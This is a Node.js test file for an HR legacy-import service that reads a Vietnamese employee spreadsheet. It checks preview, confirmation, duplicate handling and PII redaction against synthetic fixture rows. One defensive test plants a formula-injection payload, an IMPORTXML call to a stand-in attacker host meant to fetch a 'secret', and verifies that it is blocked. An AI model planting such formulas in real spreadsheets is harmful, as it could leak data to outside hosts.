const assert = require('node:assert/strict');
const crypto = require('node:crypto');
const fs = require('node:fs');
const path = require('node:path');
const test = require('node:test');
const vm = require('node:vm');

class MemoryRange {
  constructor(sheet, row, column, rowCount, columnCount) {
    this.sheet = sheet;
    this.row = row;
    this.column = column;
    this.rowCount = rowCount;
    this.columnCount = columnCount;
  }

  getValues() {
    const result = [];
    for (let rowOffset = 0; rowOffset < this.rowCount; rowOffset += 1) {
      const row = [];
      for (let columnOffset = 0; columnOffset < this.columnCount; columnOffset += 1) {
        row.push(
          this.sheet.values[this.row - 1 + rowOffset]?.[
            this.column - 1 + columnOffset
          ] ?? ''
        );
      }
      result.push(row);
    }
    return result;
  }

  getDisplayValues() {
    return this.getValues().map((row) => row.map((value) => {
      if (value === null || value === undefined) return '';
      if (value instanceof Date) {
        const day = String(value.getUTCDate()).padStart(2, '0');
        const month = String(value.getUTCMonth() + 1).padStart(2, '0');
        return `${day}/${month}/${value.getUTCFullYear()}`;
      }
      return String(value);
    }));
  }

  setValues(values) {
    assert.equal(values.length, this.rowCount);
    values.forEach((sourceRow, rowOffset) => {
      assert.equal(sourceRow.length, this.columnCount);
      const targetRow = this.row - 1 + rowOffset;
      this.sheet.values[targetRow] ||= [];
      sourceRow.forEach((value, columnOffset) => {
        this.sheet.values[targetRow][this.column - 1 + columnOffset] = value;
      });
    });
    return this;
  }
}

class MemorySheet {
  constructor(name) {
    this.name = name;
    this.values = [];
    this.frozenRows = 0;
  }

  getName() {
    return this.name;
  }

  getLastRow() {
    for (let index = this.values.length - 1; index >= 0; index -= 1) {
      if ((this.values[index] || []).some((value) => value !== '' && value != null)) {
        return index + 1;
      }
    }
    return 0;
  }

  getLastColumn() {
    return this.values.reduce((maximum, row) => Math.max(maximum, row.length), 0);
  }

  getRange(row, column, rowCount, columnCount) {
    return new MemoryRange(this, row, column, rowCount, columnCount);
  }

  setFrozenRows(count) {
    this.frozenRows = count;
  }
}

class MemorySpreadsheet {
  constructor() {
    this.sheets = new Map();
  }

  getSheetByName(name) {
    return this.sheets.get(name) || null;
  }

  getSheets() {
    return [...this.sheets.values()];
  }

  insertSheet(name) {
    assert.equal(this.sheets.has(name), false);
    const sheet = new MemorySheet(name);
    this.sheets.set(name, sheet);
    return sheet;
  }
}

function legacyRows() {
  const headers = [
    'STT',
    'STT(Phòng ban)',
    'MÃ SỐ',
    'Số sổ BHXH',
    'HỌ VÀ TÊN',
    'BHYT',
    'Lương',
    'Phụ cấp',
    'TỔNG THU NHẬP',
    'GIỚI TÍNH',
    'DÂN TỘC',
    'TÔN GIÁO',
    'CHỨC VỤ',
    'ĐƠN VỊ CÔNG TÁC',
    'NGÀY SINH',
    'NGÀY LÀM',
    'HĐLĐ',
    'SỐ HĐLĐ',
    'NĂM CÔNG TÁC',
    'CMND',
    'CCCD',
    'NGÀY CẤP',
    'MÔI TRƯỜNG LÀM VIỆC',
    'NƠI CẤP',
    'NƠI SINH',
    'NƠI SINH (Sau sát nhập)',
    'ĐỊA CHỈ THƯỜNG TRÚ',
    'ĐỊA CHỈ HIỆN NAY',
    'SỐ ĐIỆN THOẠI',
    'TRÌNH ĐỘ',
    'CHUYÊN NGÀNH',
    'CÔNG VIỆC PHẢI LÀM',
    'TUỔI',
    'NGÀY NGHỈ PHÉP'
  ];
  return [
    ['', 'DANH SÁCH NHÂN SỰ'],
    ['', 'XÍ NGHIỆP PHÂN BÓN HÓA CHẤT'],
    [],
    headers,
    [
      1,
      1,
      'A268',
      '09213003755',
      'Nguyễn Công Huân',
      'DN4929213003755',
      26000000,
      0,
      26000000,
      'Nam',
      'Kinh',
      'Không',
      'Tổng Giám đốc',
      'Tổng Giám đốc',
      new Date('1970-05-10T00:00:00.000Z'),
      new Date('2000-01-03T00:00:00.000Z'),
      'Không xác định',
      '07/HĐ-PBHC/2026',
      '26 NĂM',
      '123456789',
      '092130037511',
      new Date('2021-10-10T00:00:00.000Z'),
      'Bình thường',
      'Cục Cảnh sát QLHC',
      'Quảng Nam',
      'Đà Nẵng',
      '01 Đường Nguồn',
      '02 Đường Hiện tại',
      '0901234567',
      'Đại học',
      'Quản trị',
      'Điều hành đơn vị',
      56,
      5.5
    ],
    [
      2,
      2,
      'A035',
      '5496032611',
      'Nguyễn Nam Bình',
      'DN4925496032611',
      23000000,
      1000000,
      24000000,
      'Nam',
      'Kinh',
      'Không',
      'Phó tổng giám đốc',
      'Tổng Giám đốc',
      new Date('1980-02-20T00:00:00.000Z'),
      new Date('2005-03-15T00:00:00.000Z'),
      '12 tháng',
      '08/HĐ-PBHC/2026',
      '21 NĂM',
      '',
      '054960326111',
      new Date('2022-01-02T00:00:00.000Z'),
      'Bình thường',
      'Cục Cảnh sát QLHC',
      'Quảng Ngãi',
      'Quảng Ngãi',
      '03 Đường Nguồn',
      '04 Đường Hiện tại',
      '0907654321',
      'Thạc sĩ',
      'Kinh tế',
      'Hỗ trợ điều hành',
      46,
      3
    ]
  ];
}

function loadRuntime() {
  const spreadsheet = new MemorySpreadsheet();
  spreadsheet.insertSheet('T6-26').values = legacyRows();
  const properties = new Map([
    ['APP_ENV', 'development'],
    ['MAX_PAGE_SIZE', '500']
  ]);
  let sequence = 0;
  const runtime = vm.createContext({
    console,
    Date,
    JSON,
    Math,
    Object,
    Array,
    String,
    Number,
    Boolean,
    Error,
    RegExp,
    isFinite,
    isNaN,
    PropertiesService: {
      getScriptProperties() {
        return {
          getProperty(key) {
            return properties.get(key) ?? null;
          }
        };
      }
    },
    SpreadsheetApp: {
      getActiveSpreadsheet() {
        return spreadsheet;
      },
      openById() {
        return spreadsheet;
      }
    },
    LockService: {
      getScriptLock() {
        return {
          tryLock() {
            return true;
          },
          releaseLock() {}
        };
      }
    },
    Utilities: {
      DigestAlgorithm: { SHA_256: 'SHA_256' },
      Charset: { UTF_8: 'UTF_8' },
      getUuid() {
        sequence += 1;
        return `00000000-0000-4000-8000-${String(sequence).padStart(12, '0')}`;
      },
      computeDigest(_algorithm, value) {
        return [...crypto.createHash('sha256').update(value, 'utf8').digest()];
      },
      formatDate(value, _timeZone, pattern) {
        assert.equal(pattern, 'yyyy-MM-dd');
        return [
          value.getUTCFullYear(),
          String(value.getUTCMonth() + 1).padStart(2, '0'),
          String(value.getUTCDate()).padStart(2, '0')
        ].join('-');
      }
    }
  });

  const sourceDirectory = path.resolve(__dirname, '../../src/server');
  [
    '00_Config.js',
    '01_Core.js',
    '02_Schema.js',
    '03_SheetStore.js',
    '04_AuditService.js',
    '12_WorkforceService.js',
    '16_LegacyImportService.js',
    '99_RpcEntrypoints.js'
  ].forEach((fileName) => {
    vm.runInContext(
      fs.readFileSync(path.join(sourceDirectory, fileName), 'utf8'),
      runtime,
      { filename: fileName }
    );
  });
  return { runtime, spreadsheet };
}

test('preview detects the Vietnamese legacy header without returning raw PII', () => {
  const { runtime } = loadRuntime();
  const preview = runtime.HrLegacyImportService.preview();

  assert.equal(preview.stage, 'PREVIEW');
  assert.equal(preview.ready_to_confirm, true);
  assert.equal(preview.source.sheet_name, 'T6-26');
  assert.equal(preview.source.header_row, 4);
  assert.equal(preview.source.data_rows, 2);
  assert.equal(preview.source.source_tab_modified, false);
  assert.equal(preview.summary.new_employees, 2);
  assert.equal(preview.summary.catalogs.departments.new_count, 1);
  assert.equal(preview.summary.catalogs.positions.new_count, 2);
  assert.equal(preview.summary.catalogs.working_conditions.new_count, 1);
  assert.match(preview.confirmation.confirmation_token, /^[a-f0-9]{64}$/);

  const serialized = JSON.stringify(preview);
  assert.equal(serialized.includes('Nguyễn Công Huân'), false);
  assert.equal(serialized.includes('092130037511'), false);
  assert.equal(serialized.includes('01 Đường Nguồn'), false);
});

test('confirm preserves legacy fields, keeps source immutable and feeds live roster', () => {
  const { runtime, spreadsheet } = loadRuntime();
  const source = spreadsheet.getSheetByName('T6-26');
  const sourceBefore = JSON.stringify(source.values);
  const preview = runtime.HrLegacyImportService.preview();
  const confirmed = runtime.HrLegacyImportService.confirm(preview.confirmation);

  assert.equal(confirmed.stage, 'CONFIRMED');
  assert.equal(confirmed.summary.imported_employees, 2);
  assert.equal(confirmed.summary.active_employees_after, 2);
  assert.equal(confirmed.summary.created_departments, 1);
  assert.equal(confirmed.summary.created_positions, 2);
  assert.equal(confirmed.summary.created_working_conditions, 1);
  assert.equal(JSON.stringify(source.values), sourceBefore);

  const employees = runtime.HrSheetStore.list(runtime.HrSchema.TABLES.EMPLOYEES);
  assert.equal(employees.length, 2);
  const first = employees.find((employee) => employee.employee_code === 'A268');
  assert.equal(first.employment_status, 'ACTIVE');
  assert.equal(first.social_insurance_number, '09213003755');
  assert.equal(first.health_insurance_number, 'DN4929213003755');
  assert.equal(first.citizen_id, '092130037511');
  assert.equal(first.permanent_address, '01 Đường Nguồn');
  assert.equal(first.phone, '0901234567');
  assert.equal(first.contract_number, '07/HĐ-PBHC/2026');
  assert.equal(first.contract_type_code, 'INDEFINITE');
  assert.equal(first.education_level, 'Đại học');
  assert.equal(first.major, 'Quản trị');
  assert.equal(first.display_order, 1);
  assert.equal(first.department_display_order, 1);
  assert.equal(first.leave_days, 5.5);
  assert.equal(first.base_salary, 26000000);
  assert.equal(
    employees.find((employee) => employee.employee_code === 'A035').contract_type_code,
    'FIXED_TERM'
  );

  const roster = runtime.HrWorkforceService.liveRoster('2026-07-01', {
    pageSize: 500
  });
  assert.equal(roster.active_count, 2);

  const audits = runtime.HrSheetStore.list(runtime.HrSchema.TABLES.AUDIT_LOGS);
  assert.equal(audits.length, 1);
  assert.equal(audits[0].actor_type, 'MIGRATION');
  assert.equal(audits[0].action, 'LEGACY_WORKFORCE_IMPORT_CONFIRMED');
  assert.equal(audits[0].sanitized_metadata_json.baseline_period, '2026-06');
  assert.equal(JSON.stringify(audits[0]).includes('Nguyễn Công Huân'), false);
  assert.equal(JSON.stringify(audits[0]).includes('092130037511'), false);
});

test('repeating confirmation is duplicate-safe by employee code', () => {
  const { runtime } = loadRuntime();
  const preview = runtime.HrLegacyImportService.preview();
  const first = runtime.HrLegacyImportService.confirm(preview.confirmation);
  const secondPreview = runtime.HrLegacyImportService.preview();
  const second = runtime.HrLegacyImportService.confirm(secondPreview.confirmation);

  assert.equal(first.summary.imported_employees, 2);
  assert.equal(first.summary.applied_source_employees, 2);
  assert.equal(second.summary.imported_employees, 0);
  assert.equal(second.summary.skipped_existing_employees, 2);
  assert.equal(second.summary.applied_source_employees, 2);
  assert.equal(second.replayed, true);
  assert.equal(
    runtime.HrSheetStore.list(runtime.HrSchema.TABLES.EMPLOYEES).length,
    2
  );
  assert.equal(
    runtime.HrSheetStore.list(runtime.HrSchema.TABLES.DEPARTMENTS).length,
    1
  );
  assert.equal(
    runtime.HrSheetStore.list(runtime.HrSchema.TABLES.AUDIT_LOGS).length,
    1
  );
});

test('confirm rejects a source changed after preview without importing employees', () => {
  const { runtime, spreadsheet } = loadRuntime();
  const preview = runtime.HrLegacyImportService.preview();
  spreadsheet.getSheetByName('T6-26').values[4][6] = 27000000;

  assert.throws(
    () => runtime.HrLegacyImportService.confirm(preview.confirmation),
    (error) => error.code === 'LEGACY_IMPORT_SOURCE_CHANGED'
  );
  assert.equal(
    runtime.HrSheetStore.list(runtime.HrSchema.TABLES.EMPLOYEES).length,
    0
  );
});

test('duplicate employee codes in the source block confirmation', () => {
  const { runtime, spreadsheet } = loadRuntime();
  spreadsheet.getSheetByName('T6-26').values[5][2] = 'A268';
  const preview = runtime.HrLegacyImportService.preview();

  assert.equal(preview.ready_to_confirm, false);
  assert.equal(preview.summary.invalid_rows, 1);
  assert.equal(
    preview.issues.some((issue) => issue.code === 'LEGACY_EMPLOYEE_CODE_DUPLICATE'),
    true
  );
  assert.throws(
    () => runtime.HrLegacyImportService.confirm(preview.confirmation),
    (error) => error.code === 'LEGACY_IMPORT_SOURCE_HAS_ERRORS'
  );
});

test('formula-like source text is blocked before any canonical record is written', () => {
  const { runtime, spreadsheet } = loadRuntime();
  spreadsheet.getSheetByName('T6-26').values[4][4] =
    '=IMPORTXML("https://attacker.invalid", "//secret")';
  const preview = runtime.HrLegacyImportService.preview();

  assert.equal(preview.ready_to_confirm, false);
  assert.equal(preview.summary.invalid_rows, 1);
  assert.equal(
    preview.issues.some((issue) => issue.code === 'LEGACY_FORMULA_TEXT_BLOCKED'),
    true
  );
  assert.equal(
    JSON.stringify(preview).includes('attacker.invalid'),
    false
  );
  assert.throws(
    () => runtime.HrLegacyImportService.confirm(preview.confirmation),
    (error) => error.code === 'LEGACY_IMPORT_SOURCE_HAS_ERRORS'
  );
  assert.equal(
    runtime.HrSheetStore.list(runtime.HrSchema.TABLES.EMPLOYEES).length,
    0
  );
});

test('RPC preview uses the full invalid-row count instead of the truncated issue list', () => {
  const { runtime } = loadRuntime();
  const dto = runtime.hrLegacyImportPreviewDto_({
    ready_to_confirm: false,
    source: { sheet_name: 'T6-26', header_row: 4 },
    summary: {
      source_rows: 250,
      new_employees: 0,
      existing_employee_codes: 0,
      invalid_rows: 225,
      warning_count: 0
    },
    issues: Array.from({ length: 200 }, (_, index) => ({
      row_number: index + 5,
      field: 'employee_code',
      severity: 'ERROR',
      code: 'LEGACY_EMPLOYEE_CODE_INVALID',
      message: 'Mã số nhân sự không hợp lệ.'
    }))
  });

  assert.equal(dto.errorRows, 225);
});

test('RPC preview token can be confirmed and safely replayed', () => {
  const { runtime } = loadRuntime();
  const preview = runtime.apiPreviewLegacyImport();

  assert.equal(preview.success, true);
  assert.equal(preview.data.readyToConfirm, true);
  assert.match(preview.data.previewToken, /^[a-f0-9]{64}$/);

  const first = runtime.apiConfirmLegacyImport(preview.data.previewToken);
  assert.equal(first.success, true);
  assert.equal(first.data.insertedEmployees, 2);
  assert.equal(first.data.appliedSourceEmployees, 2);
  assert.equal(first.data.replayed, false);

  const replay = runtime.apiConfirmLegacyImport(preview.data.previewToken);
  assert.equal(replay.success, true);
  assert.equal(replay.data.insertedEmployees, 0);
  assert.equal(replay.data.skippedEmployees, 2);
  assert.equal(replay.data.appliedSourceEmployees, 2);
  assert.equal(replay.data.replayed, true);
  assert.equal(
    runtime.HrSheetStore.list(runtime.HrSchema.TABLES.AUDIT_LOGS).length,
    1
  );
});

test('audit summary does not persist a potentially identifying source-sheet name', () => {
  const { runtime, spreadsheet } = loadRuntime();
  const source = spreadsheet.getSheetByName('T6-26');
  spreadsheet.sheets.delete('T6-26');
  source.name = 'Hồ sơ Nguyễn Văn A';
  spreadsheet.sheets.set(source.name, source);
  const preview = runtime.HrLegacyImportService.preview();
  runtime.HrLegacyImportService.confirm(preview.confirmation);
  const audits = runtime.HrSheetStore.list(runtime.HrSchema.TABLES.AUDIT_LOGS);

  assert.equal(audits.length, 1);
  assert.equal(JSON.stringify(audits).includes('Nguyễn Văn A'), false);
});

test('employee code is normalized like HrEmployeeService before persistence', () => {
  const { runtime, spreadsheet } = loadRuntime();
  spreadsheet.getSheetByName('T6-26').values[4][2] = ' a 268 ';
  const preview = runtime.HrLegacyImportService.preview();
  const confirmed = runtime.HrLegacyImportService.confirm(preview.confirmation);

  assert.equal(confirmed.summary.imported_employees, 2);
  const codes = runtime.HrSheetStore
    .list(runtime.HrSchema.TABLES.EMPLOYEES)
    .map((employee) => employee.employee_code);
  assert.equal(codes.includes('A268'), true);
  assert.equal(codes.includes(' a 268 '), false);
});

test('invalid employee code characters block import at preview', () => {
  const { runtime, spreadsheet } = loadRuntime();
  spreadsheet.getSheetByName('T6-26').values[4][2] = 'A/268';
  const preview = runtime.HrLegacyImportService.preview();

  assert.equal(preview.ready_to_confirm, false);
  assert.equal(
    preview.issues.some((issue) => issue.code === 'LEGACY_EMPLOYEE_CODE_INVALID'),
    true
  );
  assert.throws(
    () => runtime.HrLegacyImportService.confirm(preview.confirmation),
    (error) => error.code === 'LEGACY_IMPORT_SOURCE_HAS_ERRORS'
  );
});
